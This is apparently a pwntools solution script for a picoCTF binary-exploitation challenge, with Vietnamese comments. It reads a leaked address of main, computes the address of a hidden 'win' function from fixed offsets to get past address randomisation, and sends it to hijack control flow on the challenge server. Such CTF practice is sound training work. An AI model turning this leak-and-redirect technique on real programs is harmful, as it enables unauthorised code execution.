#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./vuln', checksec=False)
p=remote('rescued-float.picoctf.net', 57021)


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
            start          
            ''')
#GDB()


line = ru(b'Address of main: ').decode() + r(14).decode()
main_addr = int(line.split(": ")[1].strip(), 16)
print(hex(main_addr))
win_offset = 0x12a7  # Địa chỉ win trong file ELF
main_offset = 0x133d  # Địa chỉ main trong file ELF

# Tính địa chỉ thực của win dựa vào địa chỉ đã leak của main
win_addr = main_addr - (main_offset - win_offset)
payload = hex(win_addr) 

print(payload) # Ghi đè return address bằng địa chỉ win thực sự
sla(b'0x12345: ', payload)

#info('[*] libc leak: ' + hex(libc_leak))
#info('[*] libc base: ' + hex(libc.address))



p.interactive()
